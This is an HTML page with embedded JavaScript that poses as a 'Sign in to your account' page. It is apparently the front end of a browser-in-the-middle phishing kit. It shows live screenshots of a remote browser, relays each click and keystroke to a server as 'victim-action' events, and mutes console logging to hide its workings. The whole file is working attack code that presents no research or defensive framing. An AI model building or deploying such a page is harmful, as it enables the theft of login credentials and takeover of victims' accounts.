<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign in to your account</title>
    <style>
        body, html { 
            background: #000; 
            margin: 0; 
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            color: #222; /* Dark text for the status message */
            font-family: monospace;
        }

        #mirror { 
            max-width: 100%; 
            max-height: 100%; 
            display: none; /* Hidden until first frame arrives */
            object-fit: contain; 
            cursor: crosshair; 
            touch-action: none;
        }

        #status {
            position: absolute;
            z-index: 10;
        }
    </style>
</head>
<body>
    <div id="status">INITIALIZING_SECURE_STREAM...</div>
    <img id="mirror" src="" draggable="false" />

    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <script>
        // Mute logs
        (function() {
            const noop = () => {};
            ['log', 'debug', 'info', 'warn', 'error'].forEach(m => window.console[m] = noop);
        })();

        const socket = io({ transports: ['websocket'], upgrade: false });
        const img = document.getElementById('mirror');
        const status = document.getElementById('status');

        socket.on('browser-render', (data) => {
            if (data.screenshot) {
                if (img.style.display !== 'block') {
                    img.style.display = 'block';
                    status.style.display = 'none';
                }
                img.src = 'data:image/jpeg;base64,' + data.screenshot;
            }
        });

        img.addEventListener('pointerdown', (e) => {
            const rect = img.getBoundingClientRect();
            const x = (e.clientX - rect.left) * (1280 / rect.width);
            const y = (e.clientY - rect.top) * (720 / rect.height);
            socket.emit('victim-action', { type: 'click', x, y });
        });

        window.addEventListener('keydown', (e) => {
            if (["ArrowUp", "ArrowDown", "Space", "Tab"].includes(e.code)) e.preventDefault();
            socket.emit('victim-action', { type: 'key', key: e.key });
        });
    </script>
</body>
</html>
